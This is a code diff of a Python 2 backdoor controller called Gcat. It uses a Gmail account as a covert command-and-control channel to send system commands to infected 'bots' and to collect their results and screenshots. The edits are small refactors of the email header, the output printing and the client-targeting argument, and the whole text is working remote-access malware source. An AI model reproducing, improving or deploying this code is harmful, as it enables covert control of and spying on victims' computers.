@@ -56,10 +56,13 @@ class Gcat:
         self.c.login(gmail_user, gmail_pwd)
 
     def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):
+        
+        sub_header = 'gcat:{}:{}'.format(botid, jobid)
+
         msg = MIMEMultipart()
-        msg['From'] = 'gcat:{}:{}'.format(botid, jobid)
+        msg['From'] = sub_header
         msg['To'] = gmail_user
-        msg['Subject'] = 'gcat:{}:{}'.format(botid, jobid)
+        msg['Subject'] = sub_header
         msgtext = {'CMD': cmd, 'ARG': arg}
         msg.attach(MIMEText(str(msgtext)))
         
@@ -113,9 +116,7 @@ class Gcat:
             print "DATE: '{}'".format(msg.date)
             print "OS: " + msg.dict['SYS']
             print "ADMIN: " + str(msg.dict['ADMIN']) 
-            print "FG WINDOW: '{}'".format(msg.dict['FGWINDOW'])
-            
-            return
+            print "FG WINDOW: '{}'\n".format(msg.dict['FGWINDOW'])
 
     def getJobResults(self, botid, jobid):
         self.c.select(readonly=1)
@@ -129,7 +130,7 @@ class Gcat:
             print "JOBID: " + jobid
             print "CMD: '{}'".format(msg.dict['MSG']['CMD'])
             print ''
-            print msg.dict['MSG']['RES']
+            print msg.dict['MSG']['RES'] + '\n'
 
             if msg.attachment:
 
@@ -140,7 +141,6 @@ class Gcat:
                         image.close()
 
                     print "[*] Screenshot saved to ./data/" + imgname
-            return
 
     def logout():
         self.c.logout()
@@ -150,7 +150,7 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(description="Gcat", version='0.0.1')
     parser.add_argument("-l", dest="list", action="store_true", help="List available clients")
-    parser.add_argument("--id", dest='id', default='ALL', type=str, help="Client to target")
+    parser.add_argument("--id", dest='id', type=str, help="Client to target")
     parser.add_argument('--job-id', dest='jobid', type=str, help='Job id to retrieve')
     parser.add_argument("-i", dest='info', action='store_true', help='Retrieve info on specified client')
     parser.add_argument("-c", metavar='cmd', dest='cmd', type=str, help='Execute a system command')
